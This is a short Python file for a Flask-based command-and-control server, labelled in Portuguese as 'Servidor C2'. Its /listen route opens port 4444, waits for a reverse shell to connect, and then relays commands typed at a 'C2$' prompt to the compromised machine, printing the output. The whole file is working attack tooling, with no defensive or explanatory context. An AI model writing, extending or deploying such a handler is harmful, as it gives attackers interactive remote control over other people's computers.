import socket
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return '<h1>Servidor C2 Online</h1>'

@app.route('/listen')
def listen_for_shell():
    HOST = '0.0.0.0'
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)

    print(f'[+] Aguardando shell reversa em {HOST}:{PORT}...')
    conn, addr = server.accept()
    print(f'[+] Conexão recebida de {addr}')

    while True:
        comando = input("C2$ ")
        if comando.strip().lower() in ['exit', 'quit']:
            conn.send(b'exit\n')
            break
        conn.send((comando + '\n').encode())
        resultado = conn.recv(4096).decode()
        print(resultado)

    conn.close()
    return '[+] Conexão encerrada.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

